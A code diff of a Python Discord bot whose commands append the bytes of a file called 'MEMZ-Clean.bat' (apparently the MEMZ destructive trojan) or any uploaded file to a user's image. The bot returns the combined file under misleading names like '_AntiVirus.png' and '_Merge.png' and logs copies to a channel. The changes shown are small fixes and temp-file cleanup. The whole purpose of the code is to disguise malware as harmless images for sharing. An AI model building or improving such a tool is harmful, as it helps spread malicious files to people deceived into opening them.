@@ -1,4 +1,4 @@
-import discord,random,requests
+import discord,random,requests,os
 from PIL import Image
 from discord.ext import commands
 from discord_webhook import DiscordWebhook, DiscordEmbed
@@ -36,12 +36,14 @@ async def trigger(ctx):
         virusFile = open("MEMZ-Clean.bat", 'rb').read()
         credits = bytes(f'\n\n{watermark}{random.choice("memeQuotes")}\n\nCode and bot by: Roblox Thot#0001\nServer help by: red_muta#6029', 'utf-8')
 
-        with open("tempfiles/"+ctx.message.author.id, "wb") as file:
+        with open("tempfiles/" + str(ctx.message.author.id), "wb") as file:
             file.write(image + virusFile + credits)
 
         # send file to Discord in message
-        with open("tempfiles/"+ctx.message.author.id, "rb") as file:
+        with open("tempfiles/" + str(ctx.message.author.id), "rb") as file:
             await ctx.reply("Your file is:", file=discord.File(file, ctx.message.attachments[0].filename+"_AntiVirus.png"))
+        
+        os.remove("tempfiles/" + str(ctx.message.author.id))
     else:
         await ctx.reply(f'Please use <#863261299487014947> not <#{ctx.channel.id}>')
 
@@ -53,19 +55,19 @@ async def merge(ctx, link):
     virusFile = requests.get(ctx.message.attachments[0].url).content
     credits = bytes(f'\n\n{watermark}{random.choice("memeQuotes")}\n\nCode and bot by: Roblox Thot#0001\nServer help by: red_muta#6029', 'utf-8')
 
-    with open("tempfiles/"+ctx.message.author.id, "wb") as file:
+    with open("tempfiles/" + str(ctx.message.author.id), "wb") as file:
         file.write(image + virusFile + credits)
     
     # send file to dms in message
-    with open("tempfiles/"+ctx.message.author.id, "rb") as file:
+    with open("tempfiles/" + str(ctx.message.author.id), "rb") as file:
         await ctx.send("Your file is:", file=discord.File(file, ctx.message.attachments[0].filename+"_Merge.png"))
     
     # send file to logs channel
-    with open("tempfiles/"+ctx.message.author.id, "rb") as file:
+    with open("tempfiles/" + str(ctx.message.author.id), "rb") as file:
         await bot.get_channel(863286796736397333).send(f'New merged file by {ctx.message.author.name}({ctx.message.author.id})\nImage merged with "{ctx.message.attachments[0].filename}"', file=discord.File(file, ctx.message.attachments[0].filename+"_Merge.png"))
 
     # wipe the temp file bc fuck that
-    open("tempfile","w").close()
+    os.remove("tempfiles/" + str(ctx.message.author.id))
 
 @bot.command()
 @commands.is_owner()
